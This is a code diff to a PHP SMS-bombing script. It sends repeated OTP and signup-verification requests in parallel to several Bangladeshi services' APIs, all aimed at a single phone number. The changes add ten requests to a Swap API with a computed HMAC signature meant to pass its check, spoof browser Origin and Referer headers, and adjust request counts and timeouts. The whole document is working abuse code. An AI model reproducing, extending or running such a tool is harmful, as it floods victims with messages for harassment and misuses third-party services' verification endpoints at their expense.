@@ -15,6 +15,11 @@ if(substr($phone_11,0,1)!=="0") $phone_11 = "0".$phone_11;
 $phone_88 = "88".$phone_11;
 $phone_plus88 = "+88".$phone_11;
 
+// Secret key for Swap API
+$swap_secret = "YOUR_SECRET_KEY_HERE";
+$swap_timestamp = time();
+$swap_signature = base64_encode(hash_hmac('sha256', $phone.$swap_timestamp, $swap_secret, true));
+
 // Prepare API requests
 $api_requests = [];
 
@@ -85,49 +90,62 @@ for($i=1;$i<=10;$i++){
     ];
 }
 
-// 6️⃣ Shikho (2 times max) ✅ fixed headers
-for($i=1;$i<=2;$i++){
-    $api_requests[] = [
-        "name"=>"shikho_$i",
-        "url"=>"https://api.shikho.com/auth/v2/send/sms",
-        "data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],
-        "headers"=>[
-            'Content-Type: application/json',
-            'User-Agent: Mozilla/5.0',
-            'Origin: https://shikho.com',
-            'Referer: https://shikho.com/'
-        ]
-    ];
-}
+// 6️⃣ Shikho (1 time min)
+$api_requests[] = [
+    "name"=>"shikho_1",
+    "url"=>"https://api.shikho.com/auth/v2/send/sms",
+    "data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],
+    "headers"=>[
+        'Content-Type: application/json',
+        'User-Agent: Mozilla/5.0',
+        'Origin: https://shikho.com',
+        'Referer: https://shikho.com/'
+    ]
+];
 
-// 7️⃣ PBS (2 times max) ✅ fixed headers
-for($i=1;$i<=2;$i++){
-    $api_requests[] = [
-        "name"=>"pbs_$i",
-        "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP",
-        "data"=>["userPhone"=>$phone_11],
-        "headers"=>[
-            'Content-Type: application/json',
-            'User-Agent: Mozilla/5.0',
-            'Origin: https://pbs.com.bd'
-        ]
-    ];
-}
+// 7️⃣ PBS (1 time min)
+$api_requests[] = [
+    "name"=>"pbs_1",
+    "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP",
+    "data"=>["userPhone"=>$phone_11],
+    "headers"=>[
+        'Content-Type: application/json',
+        'User-Agent: Mozilla/5.0',
+        'Origin: https://pbs.com.bd'
+    ]
+];
 
-// 8️⃣ Iqra Live (2 times max) ✅ fixed POST
-for($i=1;$i<=2;$i++){
-    $api_requests[] = [
-        "name"=>"iqra_$i",
-        "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp",
-        "data"=>["phone"=>$phone_11],
-        "headers"=>[
-            'Content-Type: application/json',
-            'User-Agent: Mozilla/5.0',
-            'Origin: https://iqra-live.com'
-        ]
-    ];
-}
+// 8️⃣ Iqra Live (1 time min)
+$api_requests[] = [
+    "name"=>"iqra_1",
+    "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp",
+    "data"=>["phone"=>$phone_11],
+    "headers"=>[
+        'Content-Type: application/json',
+        'User-Agent: Mozilla/5.0',
+        'Origin: https://iqra-live.com'
+    ]
+];
 
+// 9️⃣ Swap API (10 time min)
+for($i=1;$i<=10;$i++){
+$api_requests[] = [
+    "name"=>"swap_$i",
+    "url"=>"https://api.swap.com.bd/api/v1/send-otp/v2",
+    "data"=>[
+        "phone"=>$phone_plus88,
+        "timestamp"=>$swap_timestamp
+    ],
+    "headers"=>[
+        'Content-Type: application/json',
+        'User-Agent: Mozilla/5.0 (Linux; Android 10)',
+        'Accept: application/json, text/plain, */*',
+        'Origin: https://swap.com.bd',
+        'Referer: https://swap.com.bd/',
+        'signature: '.$swap_signature
+    ]
+];
+}
 // Multi-cURL execution
 $results = [];
 $multiCurl = [];
@@ -138,7 +156,7 @@ foreach($api_requests as $key=>$api){
     curl_setopt($ch, CURLOPT_URL, $api['url']);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 25);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
 
     if(!isset($api['method']) || $api['method']!=="GET"){
@@ -150,7 +168,7 @@ foreach($api_requests as $key=>$api){
     curl_multi_add_handle($mh,$ch);
 }
 
-// Execute all parallel
+// Execute parallel
 $running=null;
 do{
     curl_multi_exec($mh,$running);
